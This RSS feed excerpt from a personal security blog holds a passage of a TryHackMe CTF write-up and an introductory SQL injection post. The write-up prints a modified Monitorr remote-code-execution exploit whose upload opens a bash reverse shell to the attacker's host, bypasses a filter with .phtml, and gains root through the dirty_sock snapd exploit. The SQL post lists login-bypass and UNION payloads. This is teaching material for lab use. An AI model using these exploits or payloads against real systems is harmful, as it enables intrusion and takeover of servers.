    <span class="n">headers</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&#34;User-Agent&#34;</span><span class="p">:</span> <span class="s2">&#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0&#34;</span><span class="p">,</span> <span class="s2">&#34;Accept&#34;</span><span class="p">:</span> <span class="s2">&#34;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8&#34;</span><span class="p">,</span> <span class="s2">&#34;Accept-Language&#34;</span><span class="p">:</span> <span class="s2">&#34;en-US,en;q=0.5&#34;</span><span class="p">,</span> <span class="s2">&#34;Accept-Encoding&#34;</span><span class="p">:</span> <span class="s2">&#34;gzip, deflate&#34;</span><span class="p">,</span> <span class="s2">&#34;Connection&#34;</span><span class="p">:</span> <span class="s2">&#34;close&#34;</span><span class="p">,</span> <span class="s2">&#34;Upgrade-Insecure-Requests&#34;</span><span class="p">:</span> <span class="s2">&#34;1&#34;</span><span class="p">}</span>
    <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span> <span class="n">verify</span> <span class="o">=</span> <span class="bp">False</span><span class="p">)</span>
</code></pre></div><blockquote>
<p>Let&rsquo;s run the exploit</p>
</blockquote>
<pre><code>root@kali:~/Desktop/tryhackme/YOJ# python3 48980.py https://monitorr.robyns-petshop.thm/ 10.6.29.240 443
/usr/local/lib/python3.9/site-packages/urllib3/connectionpool.py:979: InsecureRequestWarning: Unverified HTTPS request is being made to host 'monitorr.robyns-petshop.thm'. Adding certificate verification is strongly advised. See: https://urllib3.readthedocs.io/en/latest/advanced-usage.html#ssl-warnings
  warnings.warn(
&lt;div id='uploadreturn'&gt;You are an exploit.&lt;/div&gt;&lt;div id='uploaderror'&gt;ERROR: she_ll.php was not uploaded.&lt;/div&gt;&lt;/div&gt;
A shell script should be uploaded. Now we try to execute it
/usr/local/lib/python3.9/site-packages/urllib3/connectionpool.py:979: InsecureRequestWarning: Unverified HTTPS request is being made to host 'monitorr.robyns-petshop.thm'. Adding certificate verification is strongly advised. See: https://urllib3.readthedocs.io/en/latest/advanced-usage.html#ssl-warnings
  warnings.warn(

</code></pre><p>How the hell it knows 😵?</p>
<blockquote>
<p>Should be Python User-Agent or would be if the exploit wasn’t explicitly spoofing our user-agent already. Perhaps a cookie?</p>
</blockquote>
<p>Check the 🍪 in DevTools</p>
<p>Found a cookie called <code>isHuman</code> and value set to <code>1</code></p>
<p>Modified exploit :</p>
<div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python"><span class="ch">#!/usr/bin/python</span>
<span class="c1"># -*- coding: UTF-8 -*-</span>

<span class="c1"># Exploit Title: Monitorr 1.7.6m - Remote Code Execution (Unauthenticated)</span>
<span class="c1"># Date: September 12, 2020</span>
<span class="c1"># Exploit Author: Lyhin&#39;s Lab</span>
<span class="c1"># Detailed Bug Description: https://lyhinslab.org/index.php/2020/09/12/how-the-white-box-hacking-works-authorization-bypass-and-remote-code-execution-in-monitorr-1-7-6/</span>
<span class="c1"># Software Link: https://github.com/Monitorr/Monitorr</span>
<span class="c1"># Version: 1.7.6m</span>
<span class="c1"># Tested on: Ubuntu 19</span>

<span class="kn">import</span> <span class="nn">requests</span>
<span class="kn">import</span> <span class="nn">os</span>
<span class="kn">import</span> <span class="nn">sys</span>

<span class="k">if</span> <span class="nb">len</span> <span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">4</span><span class="p">:</span>
	<span class="k">print</span> <span class="p">(</span><span class="s2">&#34;specify params in format: python &#34;</span> <span class="o">+</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">+</span> <span class="s2">&#34; target_url lhost lport&#34;</span><span class="p">)</span>
<span class="k">else</span><span class="p">:</span>
    <span class="n">url</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">+</span> <span class="s2">&#34;/assets/php/upload.php&#34;</span>
    <span class="n">headers</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&#34;User-Agent&#34;</span><span class="p">:</span> <span class="s2">&#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0&#34;</span><span class="p">,</span> <span class="s2">&#34;Accept&#34;</span><span class="p">:</span> <span class="s2">&#34;text/plain, */*; q=0.01&#34;</span><span class="p">,</span> <span class="s2">&#34;Accept-Language&#34;</span><span class="p">:</span> <span class="s2">&#34;en-US,en;q=0.5&#34;</span><span class="p">,</span> <span class="s2">&#34;Accept-Encoding&#34;</span><span class="p">:</span> <span class="s2">&#34;gzip, deflate&#34;</span><span class="p">,</span> <span class="s2">&#34;X-Requested-With&#34;</span><span class="p">:</span> <span class="s2">&#34;XMLHttpRequest&#34;</span><span class="p">,</span> <span class="s2">&#34;Content-Type&#34;</span><span class="p">:</span> <span class="s2">&#34;multipart/form-data; boundary=---------------------------31046105003900160576454225745&#34;</span><span class="p">,</span> <span class="s2">&#34;Origin&#34;</span><span class="p">:</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="s2">&#34;Connection&#34;</span><span class="p">:</span> <span class="s2">&#34;close&#34;</span><span class="p">,</span> <span class="s2">&#34;Referer&#34;</span><span class="p">:</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]}</span>

    <span class="n">data</span> <span class="o">=</span> <span class="s2">&#34;-----------------------------31046105003900160576454225745</span><span class="se">\r\n</span><span class="s2">Content-Disposition: form-data; name=</span><span class="se">\&#34;</span><span class="s2">fileToUpload</span><span class="se">\&#34;</span><span class="s2">; filename=</span><span class="se">\&#34;</span><span class="s2">she_ll.php</span><span class="se">\&#34;\r\n</span><span class="s2">Content-Type: image/gif</span><span class="se">\r\n\r\n</span><span class="s2">GIF89a213213123&lt;?php shell_exec(</span><span class="se">\&#34;</span><span class="s2">/bin/bash -c &#39;bash -i &gt;&amp; /dev/tcp/&#34;</span><span class="o">+</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">+</span><span class="s2">&#34;/&#34;</span> <span class="o">+</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">+</span> <span class="s2">&#34; 0&gt;&amp;1&#39;</span><span class="se">\&#34;</span><span class="s2">);</span><span class="se">\r\n\r\n</span><span class="s2">-----------------------------31046105003900160576454225745--</span><span class="se">\r\n</span><span class="s2">&#34;</span>

    <span class="n">cookies</span> <span class="o">=</span> <span class="p">{</span>
    <span class="s2">&#34;isHuman&#34;</span> <span class="p">:</span> <span class="s2">&#34;1&#34;</span><span class="p">,</span>
    <span class="p">}</span>

    <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">,</span><span class="n">verify</span><span class="o">=</span><span class="bp">False</span><span class="p">,</span><span class="n">cookies</span> <span class="o">=</span> <span class="n">cookies</span><span class="p">)</span>
    

    <span class="k">print</span> <span class="p">(</span><span class="s2">&#34;A shell script should be uploaded. Now we try to execute it&#34;</span><span class="p">)</span>
    <span class="n">url</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">+</span> <span class="s2">&#34;/assets/data/usrimg/she_ll.php&#34;</span>
    <span class="n">headers</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&#34;User-Agent&#34;</span><span class="p">:</span> <span class="s2">&#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0&#34;</span><span class="p">,</span> <span class="s2">&#34;Accept&#34;</span><span class="p">:</span> <span class="s2">&#34;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8&#34;</span><span class="p">,</span> <span class="s2">&#34;Accept-Language&#34;</span><span class="p">:</span> <span class="s2">&#34;en-US,en;q=0.5&#34;</span><span class="p">,</span> <span class="s2">&#34;Accept-Encoding&#34;</span><span class="p">:</span> <span class="s2">&#34;gzip, deflate&#34;</span><span class="p">,</span> <span class="s2">&#34;Connection&#34;</span><span class="p">:</span> <span class="s2">&#34;close&#34;</span><span class="p">,</span> <span class="s2">&#34;Upgrade-Insecure-Requests&#34;</span><span class="p">:</span> <span class="s2">&#34;1&#34;</span><span class="p">}</span>
    <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span> <span class="n">verify</span><span class="o">=</span><span class="bp">False</span><span class="p">,</span><span class="n">cookies</span> <span class="o">=</span> <span class="n">cookies</span><span class="p">)</span>
</code></pre></div><p>Well it worked !!</p>
<h3 id="filter-bypass">Filter bypass</h3>
<p>Finally we have convinced the Web application that we are human, but it&rsquo;s still not letting us to upload anything.</p>
<ul>
<li>
<p>A regex to see if <code>php</code> appears in the filename. This thing can be bypassed by using an alternative extension such as <code>.phtml</code> or <code>.phar</code></p>
</li>
<li>
<p><code>she_ll.php</code> changed to <code>she_ll.jpg.phtml</code></p>
</li>
</ul>
<p><strong>This is the final exploit</strong></p>
<div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python"><span class="kn">import</span> <span class="nn">requests</span>
<span class="kn">import</span> <span class="nn">os</span>
<span class="kn">import</span> <span class="nn">sys</span>
<span class="kn">import</span> <span class="nn">random</span>
<span class="kn">import</span> <span class="nn">string</span>

<span class="k">if</span> <span class="nb">len</span> <span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">4</span><span class="p">:</span>
	<span class="k">print</span> <span class="p">(</span><span class="s2">&#34;specify params in format: python &#34;</span> <span class="o">+</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">+</span> <span class="s2">&#34; target_url lhost lport&#34;</span><span class="p">)</span>
<span class="k">else</span><span class="p">:</span>
    <span class="n">url</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">+</span> <span class="s2">&#34;/assets/php/upload.php&#34;</span>
    <span class="n">headers</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&#34;User-Agent&#34;</span><span class="p">:</span> <span class="s2">&#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0&#34;</span><span class="p">,</span> 
    <span class="s2">&#34;Accept&#34;</span><span class="p">:</span> <span class="s2">&#34;text/plain, */*; q=0.01&#34;</span><span class="p">,</span> 
    <span class="s2">&#34;Accept-Language&#34;</span><span class="p">:</span> <span class="s2">&#34;en-US,en;q=0.5&#34;</span><span class="p">,</span> 
    <span class="s2">&#34;Accept-Encoding&#34;</span><span class="p">:</span> <span class="s2">&#34;gzip, deflate&#34;</span><span class="p">,</span> <span class="s2">&#34;X-Requested-With&#34;</span><span class="p">:</span> <span class="s2">&#34;XMLHttpRequest&#34;</span><span class="p">,</span> <span class="s2">&#34;Content-Type&#34;</span><span class="p">:</span> <span class="s2">&#34;multipart/form-data; boundary=---------------------------31046105003900160576454225745&#34;</span><span class="p">,</span> 
    <span class="s2">&#34;Origin&#34;</span><span class="p">:</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> 
    <span class="s2">&#34;Connection&#34;</span><span class="p">:</span> <span class="s2">&#34;close&#34;</span><span class="p">,</span> 
    <span class="s2">&#34;Referer&#34;</span><span class="p">:</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]}</span>
    <span class="n">filename</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span><span class="o">.</span><span class="n">join</span><span class="p">([</span><span class="n">random</span><span class="o">.</span><span class="n">choice</span><span class="p">(</span><span class="n">string</span><span class="o">.</span><span class="n">ascii_lowercase</span><span class="p">)</span> <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">random</span><span class="o">.</span><span class="n">randint</span><span class="p">(</span><span class="mi">5</span><span class="p">,</span><span class="mi">12</span><span class="p">))])</span>

    <span class="n">data</span> <span class="o">=</span> <span class="n">f</span><span class="s2">&#34;-----------------------------31046105003900160576454225745</span><span class="se">\r\n</span><span class="s2">Content-Disposition: form-data; name=</span><span class="se">\&#34;</span><span class="s2">fileToUpload</span><span class="se">\&#34;</span><span class="s2">; filename=</span><span class="se">\&#34;</span><span class="s2">{filename}.gif.phtml</span><span class="se">\&#34;\r\n</span><span class="s2">Content-Type: image/gif</span><span class="se">\r\n\r\n</span><span class="s2">GIF89a213213123&lt;?php shell_exec(</span><span class="se">\&#34;</span><span class="s2">/bin/bash -c &#39;bash -i &gt;&amp; /dev/tcp/&#34;</span><span class="o">+</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">+</span><span class="s2">&#34;/&#34;</span> <span class="o">+</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">+</span> <span class="s2">&#34; 0&gt;&amp;1&#39;</span><span class="se">\&#34;</span><span class="s2">);</span><span class="se">\r\n\r\n</span><span class="s2">-----------------------------31046105003900160576454225745--</span><span class="se">\r\n</span><span class="s2">&#34;</span>

    <span class="n">cookies</span> <span class="o">=</span> <span class="p">{</span>
    <span class="s2">&#34;isHuman&#34;</span> <span class="p">:</span> <span class="s2">&#34;1&#34;</span>
    <span class="p">}</span>

    <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">,</span> <span class="n">verify</span><span class="o">=</span><span class="bp">False</span><span class="p">,</span> <span class="n">cookies</span> <span class="o">=</span> <span class="n">cookies</span><span class="p">)</span>
    <span class="k">print</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>

    <span class="k">print</span> <span class="p">(</span><span class="s2">&#34;A shell script should be uploaded. Now we try to execute it&#34;</span><span class="p">)</span>
    <span class="n">url</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">+</span> <span class="n">f</span><span class="s2">&#34;/assets/data/usrimg/{filename}.gif.phtml&#34;</span>
    <span class="n">headers</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&#34;User-Agent&#34;</span><span class="p">:</span> <span class="s2">&#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0&#34;</span><span class="p">,</span> <span class="s2">&#34;Accept&#34;</span><span class="p">:</span> <span class="s2">&#34;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8&#34;</span><span class="p">,</span> <span class="s2">&#34;Accept-Language&#34;</span><span class="p">:</span> <span class="s2">&#34;en-US,en;q=0.5&#34;</span><span class="p">,</span> <span class="s2">&#34;Accept-Encoding&#34;</span><span class="p">:</span> <span class="s2">&#34;gzip, deflate&#34;</span><span class="p">,</span> <span class="s2">&#34;Connection&#34;</span><span class="p">:</span> <span class="s2">&#34;close&#34;</span><span class="p">,</span> <span class="s2">&#34;Upgrade-Insecure-Requests&#34;</span><span class="p">:</span> <span class="s2">&#34;1&#34;</span><span class="p">}</span>
    <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span> <span class="n">verify</span><span class="o">=</span><span class="bp">False</span><span class="p">,</span> <span class="n">cookies</span> <span class="o">=</span> <span class="n">cookies</span><span class="p">)</span>
</code></pre></div><blockquote>
<p>Note: Here, the exploit produces random names with an extension <code>.phtml</code></p>
</blockquote>
<p>Let&rsquo;s exploit to get a reverse shell ..!</p>
<p><img src="/img/blog/YOJ/YOJ2.png" alt="img"></p>
<blockquote>
<p>Hurray! we got the shell. All we need to do is find the flags</p>
</blockquote>
<ol>
<li>We need to stabilize the shell
<ul>
<li><code>python3 -c &quot;import pty; pty.spawn('/bin/bash')&quot;</code></li>
<li><code>ctrl + z</code></li>
<li><code>stty raw -echo</code></li>
<li><code>export TERM=xterm</code></li>
</ul>
</li>
<li>First flag - <code>www-data@petshop:/var/www$cat flag1.txt</code></li>
</ol>
<h3 id="root-privilege-escalation">Root privilege escalation</h3>
<p>We need to run <code>linPEAS.sh</code>. I have already downloaded <a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS">linPEAS </a></p>
<p><img src="/img/blog/YOJ/YOJ3.png" alt="img"></p>
<p><strong>Ngrok allows you to expose a web server running on your local machine to the internet. Just tell ngrok what port your web server is listening on.</strong></p>
<p><a href="https://ngrok.com/docs">Ngrok Documentation</a></p>
<p><a href="https://ngrok.com/download">Download Ngrok</a></p>
<p><strong>Updog is a replacement for Python&rsquo;s <code>SimpleHTTPServer</code>. It allows uploading and downloading via HTTP/S, can set ad hoc SSL certificates and use HTTP basic auth.</strong></p>
<pre><code>pip install updog
</code></pre><pre><code>www-data@petshop:/dev/shm$ chmod +x linpeas.sh
www-data@petshop:/dev/shm$ ./linpeas.sh
 Starting linpeas. Caching Writable Folders...
</code></pre><blockquote>
<p>linpeas flagged <strong>HTTP sockets</strong>
<a href="https://book.hacktricks.xyz/linux-unix/privilege-escalation#sockets">Sockets</a></p>
</blockquote>
<blockquote>
<p>Check this for Basic Linux Privilege Escalation <a href="https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/">LPE</a></p>
</blockquote>
<p><strong>What applications are installed? What version are they? Are they currently running?</strong></p>
<pre><code>www-data@petshop:/dev/shm$ ls -alh /usr/bin/
</code></pre><p>After the run, I found interesting about <code>Snapd</code> checking this with searchsploit.</p>
<pre><code>root@kali:~# searchsploit snapd 2.32.5
----------------------------------------------------------------------------------------------------------------
 Exploit Title                                                                 |  Path
----------------------------------------------------------------------------------------------------------------
snapd &lt; 2.37 (Ubuntu) - 'dirty_sock' Local Privilege Escalation (1)            | linux/local/46361.py
snapd &lt; 2.37 (Ubuntu) - 'dirty_sock' Local Privilege Escalation (2)            | linux/local/46362.py
----------------------------------------------------------------------------------------------------------------
</code></pre><p>Actually it&rsquo;s a dirty Sock exploit. Learn more about <a href="https://0xdf.gitlab.io/2019/02/13/playing-with-dirty-sock.html">DirtySock</a></p>
<p>Let&rsquo;s Copy Dirty Sock 46362.py</p>
<pre><code>root@kali:~# searchsploit -m linux/local/46362.py
  Exploit: snapd &lt; 2.37 (Ubuntu) - 'dirty_sock' Local Privilege Escalation (2)
      URL: https://www.exploit-db.com/exploits/46362
     Path: /usr/share/exploitdb/exploits/linux/local/46362.py
File Type: Python script, ASCII text executable, with very long lines, with CRLF line terminators

Copied to: /root/46362.py
</code></pre><p>Let&rsquo;s run the exploit to be a <strong>Root user</strong></p>
<p><img src="/img/blog/YOJ/YOJ4.png" alt="img"></p>
<pre><code>www-data@petshop:/dev/shm$ python3 dirty.py

      ___  _ ____ ___ _   _     ____ ____ ____ _  _ 
      |  \ | |__/  |   \_/      [__  |  | |    |_/  
      |__/ | |  \  |    |   ___ ___] |__| |___ | \_ 
                       (version 2)

//=========[]==========================================\\
|| R&amp;D     || initstring (@init_string)                ||
|| Source  || https://github.com/initstring/dirty_sock ||
|| Details || https://initblog.com/2019/dirty-sock     ||
\\=========[]==========================================//


[+] Slipped dirty sock on random socket file: /tmp/lwczffgrbu;uid=0;
[+] Binding to socket file...
[+] Connecting to snapd API...
[+] Deleting trojan snap (and sleeping 5 seconds)...
[+] Installing the trojan snap (and sleeping 8 seconds)...
[+] Deleting trojan snap (and sleeping 5 seconds)...



********************
Success! You can now `su` to the following account and use sudo:
   username: dirty_sock
   password: dirty_sock
********************
</code></pre><p>That&rsquo;s it we got username and password</p>
<pre><code>www-data@petshop:/dev/shm$ su dirty_sock
Password: dirty_sock

To run a command as administrator (user &quot;root&quot;), use &quot;sudo &lt;command&gt;&quot;.
See &quot;man sudo_root&quot; for details.

dirty_sock@petshop:/dev/shm$ sudo whoami
[sudo] password for dirty_sock: dirty_sock

root
dirty_sock@petshop:/dev/shm$ sudo bash
root@petshop:/dev/shm# 
</code></pre><blockquote>
<p>Hurray! Now I&rsquo;m the root user</p>
</blockquote>
<p>Flag 2 - <code>root@petshop:/root# cat root.txt</code></p>
]]></content>
		</item>
		
		<item>
			<title>SQL Injection</title>
			<link>https://riteshpuvvada.github.io/posts/sql_writeup/</link>
			<pubDate>Wed, 19 May 2021 16:41:12 +0530</pubDate>
			
			<guid>https://riteshpuvvada.github.io/posts/sql_writeup/</guid>
			<description>What is SQL injection? SQL injection is a web security vulnerability that allows an attacker to interfere with the queries that an application makes to its database. It generally allows an attacker to view data that they are not normally able to retrieve. This might include data belonging to other users, or any other data that the application itself is able to access. In many cases, an attacker can modify or delete this data, causing persistent changes to the application&amp;rsquo;s content or behavior.</description>
			<content type="html"><![CDATA[<h3 id="what-is-sql-injection">What is SQL injection?</h3>
<p>SQL injection is a web security vulnerability that allows an attacker to interfere with the queries that an application makes to its database. It generally allows an attacker to view data that they are not normally able to retrieve. This might include data belonging to other users, or any other data that the application itself is able to access. In many cases, an attacker can modify or delete this data, causing persistent changes to the application&rsquo;s content or behavior.</p>
<p>In some situations, an attacker can escalate an SQL injection attack to compromise the underlying server or other back-end infrastructure, or perform a denial-of-service attack.</p>
<p><img src="/img/blog/SQL/sql.png" alt="img"></p>
<h3 id="what-is-the-impact-of-a-sql-injection">What is the impact of a SQL injection?</h3>
<p>A successful SQL injection attack can result in unauthorized access to sensitive data, such as passwords, credit card details, or personal user information. In recent years, many high-profile data breaches have been the result of SQL injection attacks, leading to reputational damage and regulatory fines. In some cases, an attacker can obtain a persistent backdoor into an organization&rsquo;s systems, leading to a long-term compromise that can go unnoticed for an extended period.</p>
<h3 id="sql-injection-examples">SQL injection examples</h3>
<p>There are a wide variety of SQL injection vulnerabilities, attacks, and techniques, which arise in different situations. Some common SQL injection examples include:</p>
<ul>
<li><code>Retrieving hidden data</code>, where you can modify an SQL query to return additional results.</li>
<li><code>Subverting application logic</code>, where you can change a query to interfere with the application&rsquo;s logic.</li>
<li><code>UNION attacks</code>, where you can retrieve data from different database tables.</li>
<li><code>Examining the database</code>, where you can extract information about the version and structure of the database.</li>
<li><code>Blind SQL injection</code>, where the results of a query you control are not returned in the application&rsquo;s responses.</li>
</ul>
<h4 id="retrieving-hidden-data">Retrieving hidden data</h4>
<blockquote>
<p>Consider a application that displays results in different categories.</p>
</blockquote>
<pre><code>https://website.com/items?category=Fruits
</code></pre><blockquote>
<p>This causes the application to make an SQL query to retrieve details.</p>
</blockquote>
<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">SELECT * FROM products WHERE <span class="nv">category</span> <span class="o">=</span> <span class="s1">&#39;Gifts&#39;</span> AND <span class="nv">released</span> <span class="o">=</span> <span class="m">1</span>
</code></pre></div><blockquote>
<p>It returns all the details from the database, attacker construct a SQL query like.</p>
</blockquote>
<pre><code>https://website.com/items?category=Fruits'--

!Query 
Select * From items where category = 'Fruits'--' AND released = 1
</code></pre><p>You can study more about <strong>Retrieving hidden data</strong> on <a href="https://portswigger.net/web-security/sql-injection#retrieving-hidden-data">PortSwigger</a></p>
<h4 id="subverting-application-logic">Subverting application logic</h4>
<blockquote>
<p>Suppose a application has login page where user can enter his username and password for example:</p>
</blockquote>
<pre><code>Username = Anonymous
Password = 12345
</code></pre><blockquote>
<p>The application checks <code>SELECT * FROM users WHERE username = 'Anonymous' AND password = '12345'</code> If the query returns the details of a user, then the login is successful.</p>
</blockquote>
<p>Here, an attacker make a simple change by using SQL comment sequence <code>--</code> to remove the password check, so he has full access to login as any user. For example</p>
<pre><code>Username = admin'--
Password = 
!Blank password

The query be like
SELECT * FROM users WHERE username = 'admin'--' AND password = ''
</code></pre><blockquote>
<p>The attacker can login easily as admin</p>
</blockquote>
<p>You can study more about <strong>Subverting application logic</strong> on <a href="https://portswigger.net/web-security/sql-injection#subverting-application-logic">PortSwigger</a></p>
<h4 id="union-attacks">UNION attacks</h4>
<blockquote>
<p>If the application is vulnerable to SQL injection, the <code>UNION</code> can used to retrieve data from other tables within the database.</p>
</blockquote>
<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">SELECT a, b FROM table1 UNION SELECT c, d FROM table2
</code></pre></div><p>You can study more about <strong>UNION attacks</strong> on <a href="https://portswigger.net/web-security/sql-injection/union-attacks">PortSwigger</a></p>
<h4 id="examining-the-database">Examining the database</h4>
<blockquote>
<p>When an attacker exploiting SQL injection vulnerability, it is necessary to gather information about the type of database.</p>
</blockquote>
<table>
<thead>
<tr>
<th style="text-align:center">Database type</th>
<th style="text-align:center">Query</th>
<th style="text-align:center">Payload</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">Microsoft, MySQL</td>
<td style="text-align:center"><code>SELECT @@version</code></td>
<td style="text-align:center"><code>' UNION SELECT @@version--</code></td>
</tr>
<tr>
<td style="text-align:center">Oracle</td>
<td style="text-align:center"><code>SELECT * FROM v$version</code></td>
<td style="text-align:center"><code>' UNION SELECT * FROM v$version </code></td>
</tr>
<tr>
<td style="text-align:center">PostgreSQL</td>
<td style="text-align:center"><code>SELECT version()</code></td>
<td style="text-align:center"><code>' UNION SELECT version() </code></td>
</tr>
</tbody>
</table>
<p>You can study more about <strong>Examining the database</strong> on <a href="https://portswigger.net/web-security/sql-injection/examining-the-database">PortSwigger</a></p>
<h4 id="blind-sql-injection">Blind SQL injection</h4>
<blockquote>
<p>Blind SQL injection asks the database true or false questions and determines the answer based on the applications response. This attack is often used when the web application is configured to show generic error messages, but has not mitigated the code that is vulnerable to SQL injection.</p>
</blockquote>
<p>You can study more about <strong>Blind SQL injection</strong> on <a href="https://portswigger.net/web-security/sql-injection/blind">PortSwigger</a> and <a href="https://owasp.org/www-community/attacks/Blind_SQL_Injection">OWASP</a></p>
<p><em><strong>Get your hands dirty on SQL injection with TryHackMe</strong></em></p>
<ul>
<li><a href="https://tryhackme.com/room/sqlilab">Link to the room</a></li>
<li>A detail writeup of SQL injection room <a href="https://riteshpuvvada.medium.com/sql-injection-lab-735ec68b3be5">My writeup</a></li>
<li>Checkout my THM profile <a href="https://tryhackme.com/p/RiteshPuvvada">Profile</a></li>
</ul>
]]></content>
		</item>
		
	</channel>
</rss>
